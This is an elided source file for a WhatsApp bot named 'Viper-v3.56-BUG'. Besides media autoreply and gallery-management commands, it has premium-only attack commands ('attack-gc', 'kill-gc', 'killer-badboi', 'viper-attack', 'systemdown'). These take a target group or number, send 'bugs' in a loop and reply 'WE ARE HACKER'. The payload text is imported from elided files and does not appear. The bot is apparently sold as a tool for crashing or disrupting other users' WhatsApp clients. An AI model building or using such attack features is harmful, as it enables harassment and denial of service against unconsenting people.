...
const { xeontext4 } = require('./viper/xeontext4')
const { xeontext5 } = require('./viper/xeontext5')
const { xeontext6 } = require('./viper/xeontext6')
const { xeontext7 } = require('./viper/xeontext7')
const { xeontext8 } = require('./viper/xeontext8')
const { xeontext9 } = require('./viper/xeontext9')
const { xeontext10 } = require('./viper/xeontext10')
const wkwk = fs.readFileSync(`./viper/x.mp3`)
...
let audiobuffy = fs.readFileSync(`./ViperGallery/audio/${BhosdikaXeon}.mp3`)
XeonBotInc.sendMessage(m.chat, { audio: audiobuffy, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
}
}
for (let BhosdikaXeon of StickerXeon){
if (budy === BhosdikaXeon){
let stickerbuffy = fs.readFileSync(`./ViperGallery/sticker/${BhosdikaXeon}.webp`)
XeonBotInc.sendMessage(m.chat, { sticker: stickerbuffy }, { quoted: m })
}
}
for (let BhosdikaXeon of ImageXeon){
if (budy === BhosdikaXeon){
let imagebuffy = fs.readFileSync(`./ViperGallery/image/${BhosdikaXeon}.jpg`)
XeonBotInc.sendMessage(m.chat, { image: imagebuffy }, { quoted: m })
}
}
for (let BhosdikaXeon of VideoXeon){
if (budy === BhosdikaXeon){
let videobuffy = fs.readFileSync(`./ViperGallery/video/${BhosdikaXeon}.mp4`)
...
if (budy === BhosdikaXeon) {
let buffer = fs.readFileSync(`./ViperGallery/apk/${BhosdikaXeon}.apk`)
sendapk(buffer)
}
}
...
if (budy === BhosdikaXeon) {
let buffer = fs.readFileSync(`./ViperGallery/zip/${BhosdikaXeon}.zip`)
sendzip(buffer)
}
}
...
if (budy === BhosdikaXeon) {
let buffer = fs.readFileSync(`./ViperGallery/doc/${BhosdikaXeon}.pdf`)
senddocu(buffer)
}
}
...
VIPER-v3.56-BUG-BUG-CONNECTED SUCCESSFULLY 
...
`.trim()
            ...
            case 'buyprem':
            case 'premium': {
                let teks = `Hi ${pushname}👋\nWant to Buy Premium? Just chat with the owner badboi or viper😉`
                await XeonBotInc.sendMessage(m.chat, {
                    text: teks,
                    contextInfo: {
                        externalAdReply: {
            ...
            break
            case 'runtime':
                let runtimetext = `Viper-v3.56-BUG 𝙼𝙳 𝙷𝙰𝚂 𝙱𝙴𝙴𝙽 𝙾𝙽𝙻𝙸𝙽𝙴. 𝙲𝙻𝙸𝙲𝙺 𝚃𝙾 𝙲𝙷𝙴𝙲𝙺 𝙼𝚈 𝚁𝚄𝙽𝚃𝙸𝙼𝙴⬇️👇
		${readmore}
		Viper-v3.56-BUG Have Been Running For ${runtime(process.uptime())}`
                XeonBotInc.sendMessage(m.chat, {
                    text: runtimetext,
                    contextInfo: {
                        externalAdReply: {
...
break
            case 'addvideo': {
                ...
                VideoXeon.push(q)
                await fsx.copy(delb, `./ViperGallery/video/${q}.mp4`)
            ...
            case 'delvideo': {
                ...
                fs.writeFileSync('./database/autoreply/video.json', JSON.stringify(VideoXeon))
                fs.unlinkSync(`./ViperGallery/video/${q}.mp4`)
            ...
            case 'addimage': {
                ...
                let delb = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
                ImageXeon.push(q)
                await fsx.copy(delb, `./ViperGallery/image/${q}.jpg`)
            ...
            case 'delimage': {
                ...
                fs.writeFileSync('./database/autoreply/image.json', JSON.stringify(ImageXeon))
                fs.unlinkSync(`./ViperGallery/image/${q}.jpg`)
            ...
            case 'addsticker': {
                ...
                let delb = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
                StickerXeon.push(q)
                await fsx.copy(delb, `./ViperGallery/sticker/${q}.webp`)
            ...
            case 'delsticker': {
                ...
                fs.writeFileSync('./database/autoreply/sticker.json', JSON.stringify(StickerXeon))
                fs.unlinkSync(`./ViperGallery/sticker/${q}.webp`)
            ...
            case 'addvn': {
                ...
                await fsx.copy(delb, `./ViperGallery/audio/${q}.mp3`)
            ...
            case 'delvn': {
                ...
                fs.writeFileSync('./database/autoreply/vn.json', JSON.stringify(VoiceNoteXeon))
                fs.unlinkSync(`./ViperGallery/audio/${q}.mp3`)
...
let delb = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
ZipXeon.push(teks)
await fsx.copy(delb, `./ViperGallery/zip/${teks}.zip`)
...
fs.writeFileSync('./database/autoreply/zip.json', JSON.stringify(ZipXeon))
fs.unlinkSync(`./ViperGallery/zip/${teks}.zip`)
...
let delb = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
apknye.push(teks)
await fsx.copy(delb, `./ViperGallery/apk/${teks}.apk`)
...
fs.writeFileSync('./database/autoreply/apk.json', JSON.stringify(ApkXeon))
fs.unlinkSync(`./ViperGallery/apk/${teks}.apk`)
...
let delb = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
docunye.push(teks)
await fsx.copy(delb, `./ViperGallery/doc/${teks}.pdf`)
...
fs.writeFileSync('./database/autoreply/doc.json', JSON.stringify(DocXeon))
fs.unlinkSync(`./ViperGallery/doc/${teks}.pdf`)
...
break
            case 'afk':
                ...
                break;
                          case 'play': {
                    if (!text) return replygcxeon(`*Example*: ${prefix + command} badboi text`)
                        ...
                        m.chat,
                        {
                            ...
                            contextInfo: {
                                externalAdReply: {
                                    ...
                                    thumbnailUrl:
                                    "https://i.imgur.com/A8LuCoD.jpeg",
                                        ...
                                        m.chat,
                                        {
                                            ...
                                            contextInfo: {
                                                externalAdReply: {
                                                    ...
                                                    body: global.namaCreator,
                                                    thumbnailUrl:
                                                    "https://i.imgur.com/9f8ucRW.jpeg",
                                                    sourceUrl: global.isLink,
                                                    mediaType: 1,
                                                    renderLargerThumbnail: true
                                                }
                                                        ...
                                                        m.chat,
                                                        {
                                                            ...
                                                            contextInfo: {
                                                                externalAdReply: {
                                                                    ...
                                                                    body: global.namaCreator,
                                                                    thumbnailUrl:
                                                                    "https://i.imgur.com/OhgBU9b.jpeg",
                                                                    sourceUrl: global.isLink,
                                                                    mediaType: 1,
                                                                    renderLargerThumbnail: true
                                                                }
...
case "killer-badboi": {
  ...
  sendMessageWithMentions(
    ...
    " Using *" + command + "𝗣𝗢𝗪𝗘𝗥𝗘𝗗 𝗕𝗬 𝗚𝗔𝗕𝗕𝗬𒅒.", 
    [whatsappNumber]
  );
}
break;
...
break;
 case 'attack-gc': case 'kill-gc': {
 if (!isPremium) return replygcxeon(mess.prem);
 if (!q) return replygcxeon(`Penggunaan .${command} 1962623836281@g.us`)
 replygcxeon(mess.bugrespon)
 target = q
 for (let j = 0; j < 5; j++) {
 ...
 replygcxeon(`<✓> Successfully Send Bug to ${target} Using . ✅\n\n<!> WE ARE HACKER.`)
 }
  break;
  case "viper-attack":
  case "systemdown": {
...
if (typemenu === 'v1') {
                    ...
                    XeonBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./Viperdatabase/thumb2.mp4'),
      gifPlayback: true,
      caption: xeonmenuoh,
      contextInfo: {
      externalAdReply: {
      ...
      renderLargerThumbnail: true
                    ...
                    XeonBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./ViperGallery/thumb2.mp4'),
                        caption: xeonmenuoh,
                        gifPlayback: true
                    }, {
                        quoted: m
